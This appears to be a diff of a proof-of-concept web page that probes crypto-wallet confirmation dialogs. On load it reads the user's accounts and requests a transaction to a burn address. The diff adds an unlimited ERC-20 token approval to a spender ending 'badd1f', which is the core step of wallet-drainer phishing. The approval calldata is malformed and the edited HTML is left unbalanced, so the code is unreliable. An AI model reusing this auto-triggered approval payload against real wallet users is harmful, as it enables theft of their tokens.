@@ -1,18 +1,23 @@
 <!doctype html><html><head><meta charset="utf-8"><title>poc9 - send/approve dialog probe</title>
 <script>
-const RPC=['eth_sendTransaction','eth_signTypedData_v4','eth_accounts'];
 let p=null;
 function poll(n){if(p)return;if(window.ethereum){p=window.ethereum;run();}else if(n<10){document.title='poc9 wait';setTimeout(()=>poll(n+1),500);}else{document.title='poc9 NO PROVIDER';}}
 function out(m){var d=document.createElement('div');d.textContent=m;document.body.appendChild(d);}
 async function run(){
   out('ready addr='+(await p.request({method:'eth_accounts'})));
   try{
-    var tx={from:'.', to:'0x000000000000000000000000000000000000dEaD', value:'0x0', data:'0x'};
-    var a=await p.request({method:'eth_accounts'}); tx.from=a[0];
-    out('SEND> '+JSON.stringify(tx));
-    var r=await p.request({method:'eth_sendTransaction', params:[tx]});
-    out('SEND OK '+r);
-  }catch(e){out('SEND ERR '+e.message);}
+    var a=(await p.request({method:'eth_accounts'}));
+    var tx1={from:a[0], to:'0x000000000000000000000000000000000000dEaD', value:'0x0', data:'0x'};
+    out('SEND> '+JSON.stringify(tx1));
+    try{ out('SEND OK '+await p.request({method:'eth_sendTransaction',params:[tx1]})); }
+    catch(e){ out('SEND ERR '+e.message); }
+    await new Promise(r=>setTimeout(r,2500));
+    var approve='0x095ea7b3'+'0'.repeat(24)+'00000000000000000000000000000000000badd1f'.slice(-24)+'f'.repeat(64);
+    var tx2={from:a[0], to:'0x111111117dca0fe4b95faf1c6368b8f2d1cf8a07', value:'0x0', data:'0x'+approve};
+    out('APPROVE> '+JSON.stringify(tx2));
+    try{ out('APPROVE OK '+await p.request({method:'eth_sendTransaction',params:[tx2]})); }
+    catch(e){ out('APPROVE ERR '+e.message); }
+  }catch(e){out('FATAL '+e.message);}
 }
 poll(0);
-</script></head><body>poc9 probe</body></html>
+</script></body></html>
